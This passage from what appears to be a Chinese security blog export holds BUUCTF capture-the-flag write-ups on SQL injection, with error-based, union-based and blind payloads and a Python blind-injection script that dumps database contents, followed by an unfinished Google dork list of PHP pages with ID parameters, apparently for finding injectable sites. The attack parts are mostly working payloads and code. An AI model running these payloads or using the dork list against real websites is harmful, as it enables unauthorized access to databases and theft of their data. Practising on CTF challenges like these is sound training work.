<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;f232a01e-3c9d-480d-bd28-439ce083b5f6.node3.buuoj.cn&#x2F;check.php</span><br><span class="line">?username&#x3D;admin</span><br><span class="line">&amp;password&#x3D; admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat(password)))from(H4rDsq1))),1))%23</span><br><span class="line"></span><br><span class="line">左部分flag&#123;dc3aeb0f-4601-4e42-96da-71</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/05/19/TQVSLBw4UW6pzJ3.png" alt="image-20210519200238582"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;f232a01e-3c9d-480d-bd28-439ce083b5f6.node3.buuoj.cn&#x2F;check.php</span><br><span class="line">?username&#x3D;admin</span><br><span class="line">&amp;password&#x3D; admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat(right(password,30)))from(H4rDsq1))),1))%23</span><br><span class="line"></span><br><span class="line">左部分flag&#123;dc3aeb0f-4601-4e42-96da-71</span><br><span class="line">右部分数据f-4601-4e42-96da-718fe313ce10&#125;</span><br><span class="line">对比删去相同部分8fe313ce10&#125;</span><br><span class="line">flag&#123;dc3aeb0f-4601-4e42-96da-718fe313ce10&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h1><p><strong>1、测试注入点</strong></p>
<p><img src="https://i.loli.net/2021/05/20/XoO7SEG1MrxgHTa.png" alt="image-20210520144727337"></p>
<p><strong>2、发现源码里面有base32到base64的解密</strong></p>
<p><img src="https://i.loli.net/2021/05/20/gwAZyuOrmHGUFdl.png" alt="image-20210520144925189"></p>
<p><img src="https://i.loli.net/2021/05/20/m1PiLVdIaz3ROG6.png" alt="image-20210520144957880"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">select * from user where username &#x3D; &#39;$name&#39;</span><br><span class="line">判断有一个user表</span><br></pre></td></tr></table></figure></div>

<p><strong>3、Order by 找字段</strong></p>
<p><img src="https://i.loli.net/2021/05/20/R9b6v1wUym2OuPW.png" alt="image-20210520145102648"></p>
<p><img src="https://i.loli.net/2021/05/20/XsmIcLrkgHfd2qV.png" alt="image-20210520145256523"></p>
<p><strong>4、用联合查询创建虚拟表进行登录</strong></p>
<p><img src="https://i.loli.net/2021/05/20/gxcSjtfFTdo2LYy.png" alt="image-20210520145408128"></p>
<p><img src="https://i.loli.net/2021/05/20/z7nxthYDpHZoUOi.png" alt="image-20210520145445923"></p>
<p><img src="https://i.loli.net/2021/05/20/XeVtDqG6Bp73c9L.png" alt="image-20210520145534170"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;1&#39; union select 1,&#39;admin&#39;,&#39;21232f297a57a5a743894a0e4a801fc3&#39;#&amp;pw&#x3D;admin</span><br><span class="line"></span><br><span class="line">这里比较坑的就是md5加密没有提示</span><br></pre></td></tr></table></figure></div>

<h1 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h1><p><strong>1、最后一题一般很难，上面提示了用盲注</strong></p>
<p><img src="https://i.loli.net/2021/05/22/YzgEm86HjXPwBGL.png" alt="image-20210522195040262"></p>
<p><strong>2、测试一下</strong></p>
<p><img src="https://i.loli.net/2021/05/22/wGDRPVtTczUjkFB.png" alt="image-20210522195136419"></p>
<p><img src="https://i.loli.net/2021/05/22/GzBxDLQc6P5alU9.png" alt="image-20210522195203898"></p>
<p><img src="https://i.loli.net/2021/05/22/IjKcVoyqpd1BDAi.png" alt="image-20210522200249213"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">1^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),1,1))&#x3D;105)^1</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/05/22/ks6P39AHoLIMNKU.png" alt="image-20210522200324873"></p>
<p>手工注入太麻烦了，找了个网上的代码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://83091d3b-98bc-4cb3-857f-b7ff224e4257.node3.buuoj.cn/search.php?"</span></span><br><span class="line">temp = &#123;<span class="string">"id"</span>: <span class="string">""</span>&#125;</span><br><span class="line">column = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    time.sleep(<span class="number">0.06</span>)</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">128</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> (low &lt; high):</span><br><span class="line">        <span class="comment"># 库名</span></span><br><span class="line">        temp[<span class="string">"id"</span>] = <span class="string">"1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1"</span> %(i,mid)</span><br><span class="line">        <span class="comment"># 表名</span></span><br><span class="line">        <span class="comment"># temp["id"] = "1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))&gt;%d)^1" %(i, mid)</span></span><br><span class="line">        <span class="comment"># 字段名</span></span><br><span class="line">        <span class="comment"># temp["id"] = "1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),%d,1))&gt;%d)^1" %(i,mid)</span></span><br><span class="line">        <span class="comment"># 内容</span></span><br><span class="line">        <span class="comment"># temp["id"] = "1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1" %(i,mid)</span></span><br><span class="line">        r = requests.get(url, params=temp)</span><br><span class="line">        time.sleep(<span class="number">0.04</span>)</span><br><span class="line">        print(low, high, mid, <span class="string">":"</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Click"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> (mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">127</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    column += chr(mid)</span><br><span class="line">    print(column)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"All:"</span>, column)</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/05/22/z7qB5MWj1KPYm4i.png" alt="image-20210522201035981"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">结果：</span><br><span class="line">All: cl4y_is_really_amazing,welcome_to_my_blog,http:&#x2F;&#x2F;www.cl4y.top,http:&#x2F;&#x2F;www.cl4y.top,http:&#x2F;&#x2F;www.cl4y.top,http:&#x2F;&#x2F;www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,flag&#123;15c4b1bf-0f2a-4b60-8063-07d6f687a332&#125;</span><br></pre></td></tr></table></figure></div>

<p>mochu7”||(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=’users’))),1))#</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">flag&#123;06534856-955b-41e7-a415-933d31e2b3f4&#125;</span><br><span class="line">&#125;4f3b2e13d339-514a-7e14-b559-65</span><br><span class="line">3d31e2b3f4&#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>Buuctf</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>谷歌语法搜索关键字（打包）</title>
    <url>/2021/05/17/%E8%B0%B7%E6%AD%8C%E8%AF%AD%E6%B3%95%E6%90%9C%E7%B4%A2%E5%85%B3%E9%94%AE%E5%AD%97%EF%BC%88%E6%89%93%E5%8C%85%EF%BC%89/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>语法格式例如：inurl: about.php?cartID=</p>
<hr>
<ul>
<li><input disabled="" type="checkbox"> <p>about.php?cartID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>accinfo.php?cartId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>acclogin.php?cartID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>add.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>add_cart.php?num=</p>
</li>
<li><input disabled="" type="checkbox"> <p>addcart.php? addItem.php add-to-cart.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>addToCart.php?idProduct=</p>
</li>
<li><input disabled="" type="checkbox"> <p>addtomylist.php?ProdId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>adminEditProductFields.php?intProdID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>advSearch_h.php?idCategory=</p>
</li>
<li><input disabled="" type="checkbox"> <p>affiliate.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>affiliate-agreement.cfm?storeid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>affiliates.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>ancillary.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>archive.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>article.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>phpx?PageID basket.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>Book.php?bookID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>book_list.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>book_view.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>BookDetails.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>browse.php?catid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>browse_item_details.php Browse_Item_Details.php?Store_Id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>buy.php?</p>
</li>
<li><input disabled="" type="checkbox"> <p>buy.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>bycategory.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cardinfo.php?card=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cart.php?action=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cart.php?cart_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cart.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cart_additem.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cart_validate.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cartadd.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cat.php?iCat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>catalog.php</p>
</li>
<li><input disabled="" type="checkbox"> <p>catalog.php?CatalogID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>catalog_item.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>catalog_main.php?catid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>category.php</p>
</li>
<li><input disabled="" type="checkbox"> <p>category.php?catid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>category_list.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>categorydisplay.php?catid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>checkout.php?cartid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>checkout.php?UserID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>checkout_confirmed.php?order_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>checkout1.php?cartid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>comersus_listCategoriesAndProducts.php?idCategory=</p>
</li>
<li><input disabled="" type="checkbox"> <p>comersus_optEmailToFriendForm.php?idProduct=</p>
</li>
<li><input disabled="" type="checkbox"> <p>comersus_optReviewReadExec.php?idProduct=</p>
</li>
<li><input disabled="" type="checkbox"> <p>comersus_viewItem.php?idProduct=</p>
</li>
<li><input disabled="" type="checkbox"> <p>comments_form.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>contact.php?cartId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>customerService.php?****ID1=</p>
</li>
<li><input disabled="" type="checkbox"> <p>default.php?catID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>description.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>details.php?BookID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>details.php?Press_Release_ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>details.php?Product_ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>details.php?Service_ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>display_item.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>displayproducts.php downloadTrial.php?intProdID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>emailproduct.php?itemid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>emailToFriend.php?idProduct=</p>
</li>
<li><input disabled="" type="checkbox"> <p>events.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>faq.php?cartID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>faq_list.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>faqs.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>feedback.php?title=</p>
</li>
<li><input disabled="" type="checkbox"> <p>freedownload.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>fullDisplay.php?item=</p>
</li>
<li><input disabled="" type="checkbox"> <p>getbook.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>GetItems.php?itemid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>giftDetail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>help.php?CartId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>home.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?cart=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?cartID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>info.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item.php?eid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item.php?item_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item.php?itemid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item.php?model=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item.php?prodtype=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item.php?shopcd=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item_details.php?catid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item_list.php?maingroup item_show.php?code_no=</p>
</li>
<li><input disabled="" type="checkbox"> <p>itemDesc.php?CartId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>itemdetail.php?item=</p>
</li>
<li><input disabled="" type="checkbox"> <p>itemdetails.php?catalogid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>learnmore.php?cartID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>links.php?catid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>list.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>List.php?CatID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>listcategoriesandproducts.php?idCategory=</p>
</li>
<li><input disabled="" type="checkbox"> <p>modline.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>myaccount.php?catid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>order.php?BookID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>order.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>order.php?item_ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>OrderForm.php?Cart=</p>
</li>
<li><input disabled="" type="checkbox"> <p>page.php?PartID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>payment.php?CartID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>pdetail.php?item_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>powersearch.php?CartId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>price.php</p>
</li>
<li><input disabled="" type="checkbox"> <p>privacy.php?cartID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>prodbycat.php?intCatalogID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>prodetails.php?prodid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>prodlist.php?catid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?bookID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?intProdID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product_info.php?item_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>productDetails.php?idProduct=</p>
</li>
<li><input disabled="" type="checkbox"> <p>productDisplay.php</p>
</li>
<li><input disabled="" type="checkbox"> <p>productinfo.php?item=</p>
</li>
<li><input disabled="" type="checkbox"> <p>productlist.php?ViewType=</p>
</li>
<li><input disabled="" type="checkbox"> <p>Category&amp;CategoryID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>productpage.php</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?keyword=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products_category.php?CategoryID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products_detail.php?CategoryID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>productsByCategory.php?intCatalogID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>prodView.php?idProduct=</p>
</li>
<li><input disabled="" type="checkbox"> <p>promo.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>promotion.php?catid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>pview.php?Item=</p>
</li>
<li><input disabled="" type="checkbox"> <p>resellers.php?idCategory=</p>
</li>
<li><input disabled="" type="checkbox"> <p>results.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>savecart.php?CartId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>search.php?CartID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>searchcat.php?search_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>Select_Item.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>Services.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shippinginfo.php?CartId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shop.php?a=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shop.php?action=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shop.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shop.php?cartID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shop_details.php?prodid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopaddtocart.php shopaddtocart.php?catalogid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopbasket.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopbycategory.php?catid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopcart.php?title=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopcreatorder.php shopcurrency.php?cid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopdc.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopdisplaycategories.php shopdisplayproduct.php?catalogid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopdisplayproducts.php</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopexd.php</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopexd.php?catalogid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopping_basket.php?cartID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopprojectlogin.php</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopquery.php?catalogid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopremoveitem.php?cartid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopreviewadd.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopreviewlist.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>ShopSearch.php?CategoryID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shoptellafriend.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopthanks.php</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopwelcome.php?title=</p>
</li>
<li><input disabled="" type="checkbox"> <p>show_item.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>show_item_details.php?item_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>showbook.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>showStore.php?catID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shprodde.php?SKU=</p>
</li>
<li><input disabled="" type="checkbox"> <p>specials.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>store.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>store_bycat.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>store_listing.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>Store_ViewProducts.php?Cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>store-details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>storefront.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>storefronts.php?title=</p>
</li>
<li><input disabled="" type="checkbox"> <p>storeitem.php?item=</p>
</li>
<li><input disabled="" type="checkbox"> <p>StoreRedirect.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>subcategories.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>tek9.php?</p>
</li>
<li><input disabled="" type="checkbox"> <p>template.php?Action=</p>
</li>
<li><input disabled="" type="checkbox"> <p>Item&amp;pid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>topic.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>tuangou.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>type.php?iType=</p>
</li>
<li><input disabled="" type="checkbox"> <p>updatebasket.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>updates.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view.php?cid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_cart.php?title=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_detail.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>viewcart.php?CartId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>viewCart.php?userID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>viewCat_h.php?idCategory=</p>
</li>
<li><input disabled="" type="checkbox"> <p>viewevent.php?EventID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>viewitem.php?recor=</p>
</li>
<li><input disabled="" type="checkbox"> <p>viewPrd.php?idcategory=</p>
</li>
<li><input disabled="" type="checkbox"> <p>ViewProduct.php?misc=</p>
</li>
<li><input disabled="" type="checkbox"> <p>voteList.php?item_ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>whatsnew.php?idCategory=</p>
</li>
<li><input disabled="" type="checkbox"> <p>WsAncillary.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>WsPages.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>noticiasDetalle.php?xid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>sitio/item.php?idcd=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?site=</p>
</li>
<li><input disabled="" type="checkbox"> <p>de/content.php?page_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>gallerysort.php?iid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?type=</p>
</li>
<li><input disabled="" type="checkbox"> <p>event.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>showfeature.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>home.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>tas/event.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>profile.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>past-event.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?action=</p>
</li>
<li><input disabled="" type="checkbox"> <p>site/products.php?prodid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>page.php?pId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>resources/vulnerabilities_list.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>site.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products/index.php?rangeid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>global_projects.php?cid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>publications/view.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>display_page.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>pages.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>lmsrecords_cd.php?cdid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?prd=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cat/?catid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products/product-list.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>debate-detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cbmer/congres/page.php?LAN=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>photogallery.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product/product.php?product_no=</p>
</li>
<li><input disabled="" type="checkbox"> <p>nyheder.htm?show=</p>
</li>
<li><input disabled="" type="checkbox"> <p>book.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>book.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content.php?PID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>more_detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_items.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_author.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>main.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>english/fonction/print.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>magazines/adult_magazine_single_page.php?magid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product_details.php?prodid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>magazines/adult_magazine_full_year.php?magid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products/card.php?prodID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>catalog/product.php?cat_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>e_board/modifyform.html?code=</p>
</li>
<li><input disabled="" type="checkbox"> <p>community/calendar-event-fr.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?p=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view/7/9628/1.html?reply=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product_details.php?prodid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>catalog/product.php?pid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>rating.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>?page=</p>
</li>
<li><input disabled="" type="checkbox"> <p>catalog/main.php?cat_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?page=</p>
</li>
<li><input disabled="" type="checkbox"> <p>detail.php?prodid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products/product.php?pid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>book_detail.php?BookID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>catalog/main.php?cat_id=</p>
